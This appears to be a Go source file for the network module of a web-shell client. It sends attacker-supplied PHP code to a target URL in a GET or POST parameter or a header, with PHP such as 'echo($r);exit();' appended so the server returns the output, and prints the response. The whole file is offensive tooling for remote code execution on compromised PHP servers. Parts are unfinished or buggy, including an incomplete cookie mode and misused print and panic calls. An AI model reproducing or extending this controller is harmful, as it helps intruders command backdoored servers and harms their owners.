package network

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/urfave/cli"
)

var NET = NETWORK{
	host:      "http://localhost",
	method:    0,
	parameter: "fuzzer",
	crypt:     false,
	status:    false,
}

type config struct {
	url    string
	method string
	form   []byte
	jar    []string
	proxy  string
	cmd    string
	status bool
}

type NETWORK struct {
	host      string
	method    int
	parameter string
	crypt     bool
	status    bool

	_config config
}

func (n *NETWORK) IsSetup() bool {
	return n.status
}

func (n *NETWORK) Setup(c *cli.Context) {
	url := c.String("u")
	method := c.Int("m")
	parameter := c.String("p")
	crypt := false

	if url == "" {
		fmt.Println("flag -u (url) is required")
		return
	}

	if parameter == "" {
		parameter = n.parameter
	}

	n.host = url
	n.method = method
	n.parameter = parameter
	n.crypt = crypt

	n.status = true
}

func (n *NETWORK) _getHandleBack() string {
	var r string

	if n.method == 0 || n.method == 1 {
		r = "echo($r);exit();"
	} else if n.method == 2 {
		r = "header('" + n.parameter + ":' . $r);exit();"
	} else if n.method == 3 {
		r = "setcookie('" + n.parameter + "', $r);exit();"
	}

	return r
}

func (n *NETWORK) _initConfig(r string) {
	c := config{
		url:    n.host,
		method: "GET",
		status: true,
	}

	request := r + n._getHandleBack()

	if n.method == 0 { //GET
		c.url = n.host + "?" + n.parameter + "=" + request
	} else if n.method == 1 { //POST
		c.form = []byte(n.parameter + "=" + request)
		c.method = "POST"
	} else if n.method == 3 { //COOKIE
		c.jar = []string{}
	} else {
		c.status = false
	}

	n._config = c
}

func (n *NETWORK) _headerConfig(req *http.Request) {
	if n.method == 2 {
		req.Header.Set(n.parameter, n._config.cmd)
	}
}

func (n *NETWORK) _handleSuccess(response *http.Response) {
	defer response.Body.Close()

	//Read status
	fmt.Println(response.Status)

	//Read body
	body, err := ioutil.ReadAll(response.Body)

	if err != nil {
		panic(err)
	}

	fmt.Println("body: %v", string(body))

	//Read headers
	fmt.Println(response.Header)

	//Read cookie
}

func (n *NETWORK) Send(r string) {
	client := &http.Client{}
	n._initConfig(r)

	if n._config.status == false {
		fmt.Println("HERE 1")
		err := new(error)
		panic(err)
	}

	req, err := http.NewRequest(n._config.method, n._config.url, bytes.NewBuffer(n._config.form))

	if err != nil {
		fmt.Println("HERE 2")
		panic(err)
	}

	n._headerConfig(req)

	resp, err := client.Do(req)

	if err != nil {
		fmt.Println("HERE 3")
		panic(err)
	}

	n._handleSuccess(resp)
}
